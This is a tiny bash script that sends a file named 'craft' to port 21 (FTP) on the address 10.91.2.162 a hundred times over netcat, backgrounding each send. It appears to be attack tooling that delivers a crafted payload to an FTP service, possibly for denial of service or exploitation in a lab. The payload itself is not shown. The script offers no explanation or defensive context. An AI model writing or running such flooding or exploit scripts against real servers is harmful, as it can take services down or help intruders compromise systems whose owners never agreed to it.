#!/bin/bash

for i in `seq 1 100`
 
do
  cat craft |  nc -nv 10.91.2.162 21 &
  sleep 2
done
